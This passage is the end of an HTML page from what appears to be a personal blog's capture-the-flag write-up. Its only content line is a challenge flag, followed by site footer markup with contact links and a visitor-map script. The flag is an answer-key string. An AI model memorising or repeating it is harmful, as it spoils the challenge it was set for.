<p><strong>Flag: CHH{w3lc0m3_70_7h3_m47h_w0rld(1_h4t3_1t_th3r3)}</strong></p>
 -->
  </div>

  <div id="disqus_thread"></div>

</article>
      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h2 class="footer-heading">George Do</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li>George Do</li>
          <li><a href="mailto:contact.georgedo@gmail.com">contact.georgedo@gmail.com</a></li>
          <!-- <li><script type="text/javascript" id="clustrmaps" src="//clustrmaps.com/map_v2.js?d=bWWMtUHXhX4_KVnkJ-k1GL_PEZEA0lCjHMP81H6JXAA&cl=ffffff&w=a"></script></li> -->
          <li><script type="text/javascript" id="clstr_globe" src="//clustrmaps.com/globe.js?d=hTxyDCpAFGmse2NCHLjlA3079v7NSBHXIjnN8mG-hlE"></script></li>
        </ul>
      </div>

      <div class="footer-col footer-col-2">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/geordo"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span><span class="username">geordo</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/georgedo_twit"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span><span class="username">georgedo_twit</span></a>

          </li>
          

          
          <li>
            <a href="https://www.linkedin.com/in/geordo">
  <span class="icon icon--linkedin"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M13.632 13.635h-2.37V9.922c0-.886-.018-2.025-1.234-2.025-1.235 0-1.424.964-1.424 1.96v3.778h-2.37V6H8.51v1.04h.03c.318-.6 1.092-1.233 2.247-1.233 2.4 0 2.845 1.58 2.845 3.637v4.188zM3.558 4.955c-.762 0-1.376-.617-1.376-1.377 0-.758.614-1.375 1.376-1.375.76 0 1.376.617 1.376 1.375 0 .76-.617 1.377-1.376 1.377zm1.188 8.68H2.37V6h2.376v7.635zM14.816 0H1.18C.528 0 0 .516 0 1.153v13.694C0 15.484.528 16 1.18 16h13.635c.652 0 1.185-.516 1.185-1.153V1.153C16 .516 15.467 0 14.815 0z" fill-rule="nonzero"/></svg></span>
  <span class="label">geordo</span>
</a>

          </li>
          
        </ul>
      </div>

      <div class="footer-col footer-col-3">
        <p>tôi muốn mình vẫn mãi như thế, có người hỏi tôi đã từng này tuổi rồi, không thể bớt một chút “tự do” được hay sao?💭
</p>
      </div>
    </div>

  </div>

</footer>


  </body>

</html>
